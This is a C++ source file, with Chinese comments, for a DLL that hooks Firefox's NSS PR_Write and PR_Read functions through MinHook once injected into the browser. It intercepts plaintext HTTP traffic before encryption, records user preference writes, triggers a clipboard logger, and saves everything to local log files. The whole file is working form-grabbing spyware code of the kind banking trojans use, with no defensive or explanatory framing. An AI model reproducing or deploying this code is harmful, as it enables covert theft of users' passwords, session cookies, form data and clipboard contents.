// HookFireFox.cpp : 定義 DLL 的匯出函式。
//
#include "pch.h"
#include "HookFireFox.h"
#include <MinHook.h>
#include <string>
#include "dynamic_library.h"
#include "utils.h"
#include "ClipboardLogger.h"


PR_Write_t fpPR_Write = nullptr;
PR_Read_t fpPR_Read = nullptr;

int HookedPR_Write(void* fd, char* buf, int amount)
{   
    std::string data = reinterpret_cast<const char*>(buf);
    
    // handle user preferences
    if (StrContain(data, "// Mozilla User Preferences"))
    {
        ClearFile("user_pref.txt");
        Log("user_pref.txt", buf);
        goto ret;
    }
    else if (StrContain(data, "user_pref"))
    {
        Log("user_pref.txt", buf);
        goto ret;
    }

    // log HTTP 的封包內容
    if (data.rfind("{") != std::string::npos && StrContain(data, "HTTP"))
    {
		ClipboardLogger();
		Log("http.txt", "--- Write ---\n");
        Log("http.txt", buf);
        Log("http.txt", "\n---\n");
    }

ret:
    // 記錄原始資料
    Log("raw.txt", "--- Write ---\n");
    Log("raw.txt", buf);
    Log("raw.txt", "\n---\n");
    return fpPR_Write(fd, buf, amount);
}

int HookedPR_Read(void* fd, void* buf, int amount)
{
    int val = fpPR_Read(fd, buf, amount);
    std::string data = reinterpret_cast<const char*>(buf);

    // log HTTP 的封包內容
    if (StrContain(data, "HTTP"))
    {
        Log("http.txt", "--- Read ---\n");
        Log("http.txt", data);
        Log("http.txt", "\n---\n");
    }

ret:
    Log("raw.txt", "--- Read ---\n");
    Log("raw.txt", data);
    Log("raw.txt", "\n---\n");
    return val;
}


BOOL InstallHooks()
{
    if (MH_Initialize() != MH_OK)
    {
        return FALSE;
    }

    // Hook nss3.dll 中的 PR_Write 函數
    HINSTANCE nss3dLL = GetModuleHandleW(L"nss3.dll");
    if (nss3dLL == NULL) {
        Log("log.txt", "[-] Get nss3.dll handle failed.\n");
        return FALSE;
    }

    // setting PR_Write
    PR_Write_t PR_Write = (PR_Write_t)GetProcAddress(nss3dLL, "PR_Write");
    if (PR_Write == NULL) {
        Log("log.txt", "[-] Get PR_Write from nss3.dll failed.\n");
        return FALSE;
    }

    if (MH_CreateHook(PR_Write, &HookedPR_Write, reinterpret_cast<LPVOID*>(&fpPR_Write)) != MH_OK)
    {
        Log("log.txt", "[-] MinHook: create hook failed.\n");
        return FALSE;
    }

    if (MH_EnableHook(PR_Write) != MH_OK)
    {
        Log("log.txt", "[-] MinHook: enable hook failed.\n");
        return FALSE;
    }

    // Setting PR_Read
    /*PR_Write_t PR_Read = (PR_Write_t)GetProcAddress(nss3dLL, "PR_Read");
    if (PR_Write == NULL) {
        Log("log.txt", "[-] Get PR_Read from nss3.dll failed.\n");
        return FALSE;
    }

    if (MH_CreateHook(PR_Read, &HookedPR_Read, reinterpret_cast<LPVOID*>(&fpPR_Read)) != MH_OK)
    {
        Log("log.txt", "[-] MinHook: create hook failed.\n");
        return FALSE;
    }

    if (MH_EnableHook(PR_Read) != MH_OK)
    {
        Log("log.txt", "[-] MinHook: enable hook failed.\n");
        return FALSE;
    }*/
    
    Log("log.txt", "[+] Hook installed.\n");
    return TRUE;
}

void UninstallHooks()
{
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
}

void HookFireFox(void)
{
    std::string currentProcessPath = GetCurrentProcessPath();
    if (FindCaseInsensitive(currentProcessPath, "firefox") != std::string::npos)
    {
        // hooking
        Log("log.txt", "[*] installing hook, pid=" + std::to_string(GetCurrentProcessId()) + ".\n");
        InstallHooks();
    }
}
